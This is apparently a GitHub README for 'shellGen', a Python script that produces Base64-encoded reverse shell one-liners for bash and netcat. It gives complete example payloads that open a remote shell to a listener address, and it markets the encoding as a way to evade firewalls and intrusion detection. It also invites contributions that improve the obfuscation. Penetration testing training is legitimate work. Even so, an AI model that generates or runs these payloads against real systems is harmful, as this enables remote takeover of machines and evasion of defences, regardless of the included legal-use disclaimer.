# shellGen
Shell Generator is a Python script that generates encoded reverse shells for penetration testing.

## Reverse Shell Generator

This Python script generates obfuscated reverse shell payloads for penetration testing and cybersecurity training purposes. It provides a shorter and encoded reverse shell, making it less likely to be detected by firewalls or intrusion detection systems (IDS).

## Features

- Supports two reverse shell methods:
  - **Bash**: A lightweight and portable option using `/bin/bash`.
  - **Netcat (nc)**: Netcat is used to create a reverse shell (requires Netcat to be installed on the target system).
- Obfuscates payloads with Base64 encoding to enhance evasion.
- Generates compact, Python-based commands to decode and execute the payload dynamically.

## Requirements

- Python 3.x

## Usage

### Command-Line Arguments

The script accepts the following arguments:

- `ip`: The IP address of the listener (attacker's machine).
- `port`: The port number for the listener.
- `method`: The reverse shell method (`bash` or `nc`).

### Example Usage

Generate a reverse shell using the Bash method:

```bash
python3 shellGen.py 192.168.1.10 4444 bash
```
### Output:
```bash
python3 -c "import base64,os;os.system(base64.b64decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvNDQ0NCAwPiYx').decode())"
```
Generate a reverse shell using the Netcat method:

```bash
python3 shellGen.py 192.168.1.10 4444 nc
```
### Output:

``` python
python3 -c "import base64,os;os.system(base64.b64decode('bmMgMTkyLjE2OC4xLjEwIDQ0NDQgLWUgL2Jpbi9iYXNo').decode())"
```
How It Works
- The script creates a raw reverse shell payload based on the chosen method.
- The payload is encoded using Base64 for obfuscation.
- A compact Python command is generated to decode and execute the payload dynamically on the target machine.

## Considerations
* **Permissions**: Ensure you have appropriate permissions to test reverse shells in the target environment.
* **Detection**: While obfuscated, advanced security solutions may still detect these payloads. Additional evasion techniques can be layered if needed.
* **Legal Use Only**: This script is intended for educational purposes and authorized penetration testing. Unauthorized use is illegal and unethical.
## License
This project is open-source and licensed under the MIT License.

## Contributions
Feel free to contribute by adding new methods, improving obfuscation, or enhancing functionality. Fork the repository and submit a pull request.

## Contact
For questions or suggestions, contact:

- **Name**: Youssef Mouatta
- **Email**: dark88lime@gmail.com
- **GitHub**: [youssef-mouatta](https://github.com/youssef-mouatta)
- **LinkedIn**: [Youssef Mouatta](https://www.linkedin.com/in/youssef-mouatta/)
